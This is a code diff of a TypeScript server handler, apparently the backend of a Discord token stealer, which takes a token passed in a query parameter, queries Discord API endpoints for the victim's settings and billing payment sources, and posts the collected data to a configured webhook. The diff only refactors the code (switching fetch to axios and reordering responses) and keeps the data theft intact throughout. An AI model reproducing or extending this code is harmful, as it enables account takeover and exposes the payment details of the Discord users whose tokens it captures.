@@ -20,9 +20,8 @@ export default async (
     const { data: token } = request.query as { data?: string };
 
     if (!token) {
-      return response.send({ ...obj });
-    } else {
-      response.send(token);
+      response.send({ ...obj });
+      return;
     }
 
     try {
@@ -41,13 +40,12 @@ export default async (
         embeds: await embeds({ token, ...user.data })
       };
 
-      const hook = await axios.post(k4itrunConfig.webhook, CONFIG_HOOK);
-      
-      if (hook.status !== 200) return;
+      await axios.post(k4itrunConfig.webhook, CONFIG_HOOK);
     } catch (error: any) {
       console.error(error)
     }
 
+    response.send(token);
   } catch (error: any) {
     console.error(error)
   }
@@ -126,18 +124,16 @@ const languages: Languages = {
 
 async function _fetch(url: string, token: string): Promise<any> {
   try {
-    const response = await fetch(url, {
+    const response = await axios.get(url, {
       headers: {
         'Content-Type': 'application/json',
         Authorization: token
       },
     });
 
-    if (!response.ok) {
-      return 'Invalid'
-    }
+    if (response.status !== 200) return 'Invalid';
 
-    return await response.json();
+    return response.data;
   } catch (error) {
     return 'Invalid';
   }
@@ -225,7 +221,7 @@ async function embeds(user: UserProfile & { token: string }): Promise<Embed[]> {
   const settings = await _fetch(`https://discord.com/api/v9/users/@me/settings`, user.token);
   const payment = await _fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, user.token);
 
-  if(profile === 'invalid') return [];
+  if (profile === 'invalid') return [];
 
   const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
   const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;
